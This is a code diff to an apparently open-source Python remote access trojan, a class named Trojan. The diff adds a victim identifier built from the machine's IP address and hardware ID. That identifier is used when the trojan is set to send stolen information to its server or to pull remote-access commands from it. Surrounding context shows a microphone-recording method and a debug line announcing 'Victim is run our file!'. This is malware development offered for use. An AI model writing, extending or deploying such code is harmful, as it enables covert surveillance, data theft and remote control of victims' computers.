@@ -44,6 +44,10 @@ class Trojan:
         :return: [None] Not returns any.
         """
 
+        # Unique index as a string that will be used as index.
+        # May be: IP:HWID
+        self.__server_unique_request_index = None
+
         # Main server URL that will be used in for making all requests,
         # If not active, will be changed to other,
         # By default selects first active from self.__server_urls, so
@@ -98,7 +102,20 @@ class Trojan:
         # Running trojan.
         self.run()
 
-    def show_debug_message(self, message: str):
+    def generate_unique_request_index(self) -> None:
+        """
+        Generates unique index for requests if not generated.
+        :return: [None] Not returns any value.
+        """
+
+        # Getting information.
+        ip = self.get_ip()["ip"]
+        hwid = self.get_hwid()
+
+        # Generating an URI.
+        self.__server_unique_request_index = f"{ip}:{hwid}"
+
+    def show_debug_message(self, message: str) -> None:
         """
         Function that shows debug message if it is enabled.
         :param message: [str] Message of the message.
@@ -494,7 +511,7 @@ class Trojan:
         # Returning synced commands.
         return synced_commands
 
-    def remote_access_sync_response_to_server(self, response: str):
+    def remote_access_sync_response_to_server(self, response: str) -> None:
         raise NotImplementedError
 
     def record_microphone(self, seconds: int = 1) -> None:
@@ -565,6 +582,15 @@ class Trojan:
         Launches trojan by executing all needed methods.
         :return: [None] Not returns anything.
         """
+
+        # Generating URI.
+        if self.__server_unique_request_index is None:
+            # If URI is not generated.
+            if self.__setting_send_stealed_information_to_server or self.__setting_sync_remote_access_from_server:
+                # If any sending is enabled.
+
+                # Generating URI.
+                self.generate_unique_request_index()
 
         # Showing debug message.
         self.show_debug_message("Victim is run our file!")
